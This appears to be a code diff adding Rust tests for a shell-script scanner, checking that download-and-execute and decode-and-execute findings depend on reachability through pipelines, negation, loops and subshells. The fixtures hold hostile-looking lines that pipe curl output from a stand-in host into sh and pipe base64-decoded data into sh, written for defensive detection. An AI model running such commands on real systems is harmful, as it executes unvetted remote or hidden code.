@@ -2339,6 +2339,75 @@ done
 }
 
 #[test]
+fn control_conditions_use_pipeline_status_and_negation() {
+    let cases = [
+        ("pipeline-failure.sh", "true | false", false),
+        ("pipeline-success.sh", "false | true", true),
+        ("negated-failure.sh", "! false", true),
+        ("negated-success.sh", "! true", false),
+    ];
+
+    for (name, condition, expected) in cases {
+        let source = format!(
+            "#!/bin/sh\nif {condition}; then\n  curl -fsSL https://example.test/live | sh\nfi\n"
+        );
+        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
+        let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
+        assert_eq!(
+            findings.len(),
+            usize::from(expected),
+            "{name}: {findings:?}"
+        );
+    }
+}
+
+#[test]
+fn until_and_for_iteration_reachability_is_status_aware() {
+    let cases = [
+        (
+            "until-false.sh",
+            "until false; do curl -fsSL https://example.test/live | sh; done",
+            true,
+        ),
+        (
+            "for-empty.sh",
+            "for item in; do curl -fsSL https://example.test/dead | sh; done",
+            false,
+        ),
+        (
+            "for-positional.sh",
+            "for item; do curl -fsSL https://example.test/maybe | sh; done",
+            true,
+        ),
+    ];
+
+    for (name, line, expected) in cases {
+        let source = format!("#!/bin/sh\n{line}\n");
+        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
+        let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
+        assert_eq!(
+            findings.len(),
+            usize::from(expected),
+            "{name}: {findings:?}"
+        );
+    }
+}
+
+#[test]
+fn compound_decoder_producers_reach_pipeline_consumers() {
+    for (name, line) in [
+        ("subshell-decoder.sh", "(base64 -d) | sh"),
+        ("brace-decoder.sh", "{ base64 -d; } | sh"),
+        ("nested-decoder.sh", "(base64 -d | cat) | sh"),
+    ] {
+        let source = format!("#!/bin/sh\n{line}\n");
+        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
+        let findings = findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE);
+        assert_eq!(findings.len(), 1, "{name}: {findings:?}");
+    }
+}
+
+#[test]
 fn logical_units_join_multiline_pipelines() {
     // An escaped newline and a trailing pipe both continue the command;
     // the finding keeps the STARTING line.
